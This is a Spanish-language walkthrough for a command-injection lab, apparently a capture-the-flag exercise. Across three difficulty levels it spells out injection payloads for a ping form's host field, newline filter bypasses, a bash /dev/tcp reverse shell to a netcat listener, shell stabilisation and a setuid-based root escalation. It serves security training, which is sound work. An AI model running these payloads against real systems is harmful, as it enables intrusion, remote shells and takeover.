Resumen

El campo host termina dentro de un comando de shell sin sanitización. En Linux, el backend lo ejecuta como alice, así que una reverse shell caerá directamente en /home/alice.

Easy

  1. Usa separadores directos para confirmar la inyección: 
    127.0.0.1; whoami
127.0.0.1 && id
127.0.0.1 | cat /etc/passwd
127.0.0.1; ls -la /
  2. Lanza una reverse shell hacia Kali: 
    # En Kali
rlwrap nc -lvnp 4444

# Payload en el formulario
127.0.0.1; bash -c 'bash -i >& /dev/tcp/{{ target_ip }}/4444 0>&1'

Medium

  1. El filtro bloquea ; y |, pero permite && y newlines.
  2. Comprueba ejecución de comandos: 
    127.0.0.1 && whoami
127.0.0.1 && cat /etc/passwd
  3. Para Burp Repeater o una petición manual, también puedes usar newline URL-encoded: 
    host=127.0.0.1%0awhoami
  4. Lanza la reverse shell: 
    # En Kali
rlwrap nc -lvnp 4444

# Payload en el formulario
127.0.0.1 && bash -c 'bash -i >& /dev/tcp/{{ target_ip }}/4444 0>&1'

Hard

  1. El filtro bloquea ; | & ` $ ( ) { } < >. El vector útil es el newline (%0a).
  2. Intercepta la petición con Burp Suite y modifica el body: 
    host=127.0.0.1%0awhoami
host=127.0.0.1%0acat%20/etc/passwd
host=127.0.0.1%0aid
  3. Con curl, %0a también se interpreta como newline en el body: 
    curl -X POST http://TARGET_IP/cmdi/ping \
  -d "host=127.0.0.1%0awhoami"
  4. En este nivel, usa la inyección para enumerar y validar ejecución. La obtención de shell interactiva depende de construir un payload compatible con el filtro activo.

Post-Explotación

  1. Cuando entre la shell, valida el contexto inicial. Debes aterrizar como alice en su home: 
    whoami
pwd
ls -la
cat note.txt
  2. La shell inicial es una dumb shell. Estabilízala antes de la escalada: 
    python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
reset
export TERM=xterm
stty rows 40 cols 120
  3. Enumera el vector local de privilegios y eleva a root: 
    find / -perm -4000 -type f 2>/dev/null
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  4. Ya como root, lee la flag objetivo del lab: 
    cat /root/root.txt

Herramientas

Burp Suite curl netcat
